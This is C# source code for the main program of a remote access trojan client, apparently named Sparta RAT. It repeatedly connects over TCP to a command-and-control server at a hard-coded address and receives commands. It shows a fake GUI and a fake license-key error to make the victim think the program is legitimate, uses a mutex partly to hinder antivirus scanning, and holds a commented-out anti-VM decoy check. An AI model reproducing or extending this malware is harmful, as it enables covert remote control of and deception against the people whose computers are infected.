using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Setup.PrivilegeCheck;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SpartaRATclient.Setup.OSType;
using SpartaRATclient;
using System.Net.Sockets;
using RATclientSparta.Server;
using Umbral.payload.Components.AntiVM;

namespace RATclientSparta
{
    public class Program
    {
        static Mutex mutex;
        /// <summary>
        /// RAT Client side program
        /// </summary>
        [STAThread]
        private static void ConnectToHost()
        {
            while (true)
            {
                //Create Socket values
                System.Net.Sockets.Socket SocketValue = Socket.SocketServerClient.Set(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

                //Connecting to Server
                System.Net.Sockets.Socket SocketConnection = ServerEndpoint.Connect(SocketValue, "192.168.1.45", 81);

                //Calling to an instance constructor
                ServerData Connection = new ServerData(SocketConnection);

                //reading data from server - when connection lost, it will return and then Connect() again (While loop from beginning)
                Connection.Receive();
            }
        }
        static void Main()
        {
            //If debbuger or virtual machine detected, make the client think this is a legit app
            /*if (Detector.IsVirtualMachine())
            {
                OpenGUI(true);
                Environment.Exit(0);
            }*/

            //if there is a task scheduler item, I dont want a stupid GUI to popup everytime the computer starts
            if (!(RegistryCheck.CheckIfExist("HaveTaskSchedulerItem")))
            {
                //if not exist, then its the first time this program opened
                if (!RegistryCheck.CheckIfExist("FirstOpen"))
                {
                    OpenGUI(false);
                    //from now this program is not "first opened" anymore.
                    RegistryCreate.Create("FirstOpen", "0");
                    RegistryCreate.Create("OpenedAt", DateTime.Now.ToString());
                    RegistryCreate.Create("OsVersion", OSType.Type());
                }
                else
                    OpenGUI(false);
            }

            //Connecting to C&C server
            ConnectToHost();
        }

        private static void OpenGUI(bool OpenEvenAfterFirstRun)
        {
            if (!OpenEvenAfterFirstRun)
            {
                //If "FirstOpen" registry data not exist, its the first time program opened.
                //the Fake GUI will open, only once in life.

                if (!(RegistryCheck.CheckIfExist("FirstOpen")))
                    ShowGUI(true);
                else
                {
                    //I want the computer to be able to run this exe file only once, for 2 reasons: 1. I dont want to see at the server more than 1 connection from the same client and 2. maybe will make it harder for anti virus to scan this program
                    //So I used mutex to do it
                    const string MutexName = "global\\ProgramInstance";
                    bool CreatedNew;
                    mutex = new Mutex(true, MutexName, out CreatedNew);
                    if (!CreatedNew)
                        Environment.Exit(0);
                    else
                        //User opened the program again, at this point target computer user will keep think this app legit. (Because there is a fake error message, when there is nothing the computer-user may get into a "panic mode")
                        MessageBox.Show("Error: please enter the key to use this program." + Environment.NewLine + "Error ID: 45771 (No key entered)");
                }
            }
            else
                //Debugger or virtual machine detected
                ShowGUI(false);

            void ShowGUI(bool AsThread)
            {
                GUIApp application = new GUIApp();
                //When form is running as thread it will not block the code
                //When form is not running as thread it will block the code and will not continue (For example, when this function got called by the anti debugger function, I want the code not to run, just to stop there, and then Enviroment.Exit() will close the program)
                if (AsThread)
                    new Thread((() => { application.ShowDialog(); })).Start();
                else
                    application.ShowDialog();
            }
        }
    }
}
